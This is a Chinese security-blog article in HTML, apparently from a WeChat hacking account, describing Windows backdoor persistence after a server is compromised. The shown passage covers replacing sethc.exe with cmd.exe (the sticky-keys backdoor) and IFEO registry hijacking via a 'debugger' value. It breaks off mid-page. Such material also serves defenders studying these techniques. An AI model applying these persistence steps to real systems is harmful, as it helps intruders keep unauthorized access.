<html>
<head>
<title>Windows中常见后门持久化方法总结</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
Windows中常见后门持久化方法总结
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    By七友
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-10-04</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" data-mpa-powered-by="yiban.io"><span style="font-size:15px;line-height:35px;;">前言</span></h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">当我们通过各种方法拿到一个服务器的权限的时候，我们下一步要做的就是</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">后渗透</span></code><span style="font-size:15px;line-height:35px;;">了，而后门持久化也是我们后渗透很重要的一部分，下面我来总结一下</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">windows</span></code><span style="font-size:15px;line-height:35px;;">下常见的后门持久化的方法</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5650224215246636" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/1_jq7YAzvv78ibpSX6ibOH1K3M019JTQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgneaYKhcAgGt3XYu3Nj6lSv2fyzjq7YAzvv78ibpSX6ibOH1K3M019JTQ/640?wx_fmt=png'" data-type="png" data-w="669" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: auto;left: auto;right: auto;bottom: auto;"  /></p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">后门持久化</span></h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">我的操作环境是：</span></p><ol style="" class=" list-paddingleft-2"><li><p><span style="font-size:15px;line-height:35px;;">无AV、管理员权限（提权、免杀等是后门持久化的铺垫，当然有的方法也并不是全部需要这些铺垫）</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">操作系统：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">win7</span></code><span style="font-size:15px;line-height:35px;;">，</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">windows server 2008R2</span></code><span style="font-size:15px;line-height:35px;;">，</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">xp</span></code></p></li></ol><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">shift后门</span></a></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">这个是比较老的方式了，这里简单讲一下，在windows中有一些辅助功能，能在用户未登录系统之前可以通过组合键来启动它，类似的辅助功能有：</span></p><ol style="" class=" list-paddingleft-2"><li><p style="margin-top: 16px;margin-bottom: 24px;"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">C:\Windows\System32\sethc.exe</span></code><span style="font-size:15px;line-height:35px;;">&nbsp;粘滞键，启动快捷键：按五次shift键</span></p></li><li><p style="margin-top: 16px;margin-bottom: 24px;"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">C:\Windows\System32\utilman.exe</span></code><span style="font-size:15px;line-height:35px;;">&nbsp;设置中心，启动快捷键：Windows+U键</span></p></li></ol><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">在低版本的windows中，我们可以直接把</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">setch.exe</span></code><span style="font-size:15px;line-height:35px;;">替换成我们的后门程序，下面我们把</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">setch.exe</span></code><span style="font-size:15px;line-height:35px;;">替换为</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">cmd.exe</span></code><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"></code></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.14241486068111456" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/2_pFoNezx14bezSZKh3wCKJaWaibAT3A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgOIBupDKINxhRt0JrA7ISaYfHwpFoNezx14bezSZKh3wCKJaWaibAT3A/640?wx_fmt=png'" data-type="png" data-w="1292" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: auto;left: auto;right: auto;bottom: auto;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.4719405003380663" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/3_83B8hFYoia2pERW3ia5VNEDhm8TVkQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgGBvBm93aLZbBsede6xjtd9jujx83B8hFYoia2pERW3ia5VNEDhm8TVkQ/640?wx_fmt=png'" data-type="png" data-w="1479" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: auto;left: auto;right: auto;bottom: auto;"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">映像劫持</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">这个和shift后门差不多，只不过在低版本的windows中，我们可以简单地替换程序，但是在高版本的windows版本中替换的文件受到了系统的保护，所以这里我们要使用另外一个知识点：映像劫持。</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">"映像劫持"，也被称为"IFEO"（Image File Execution Options）</span></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">就是Image File Execution Options（其实应该称为"image Hijack"。）是为一些在默认系统环境中运行时可能引发错误的程序执行体提供特殊的环境设定。由于这个项主要是用来调试程序用的，对一般用户意义不大。默认是只有管理员和local system有权读写修改。<br  />PS：来自百度百科</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">简单来说就是当目标程序被映像劫持时，当我们启动目标程序时，启动的是劫持后的程序而不是原来的程序</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">操作也很简单，在注册表的</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option</span></code><span style="font-size:15px;line-height:35px;;">下添加一个项</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">sethc.exe</span></code><span style="font-size:15px;line-height:35px;;">，然后在</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">sethc.exe</span></code><span style="font-size:15px;line-height:35px;;">这个项中添加</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">debugger</span></code><span style="font-size:15px;line-height:35px;;">键，键值为我们恶意程序的路径，如下图</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.42428035043804757" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/4_hiczrpLribYO79F79noe50nOauP9TA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg21iakxdMzOcfWN0uek1DtCVCx0EhiczrpLribYO79F79noe50nOauP9TA/640?wx_fmt=png'" data-type="png" data-w="1598" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: auto;left: auto;right: auto;bottom: auto;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, 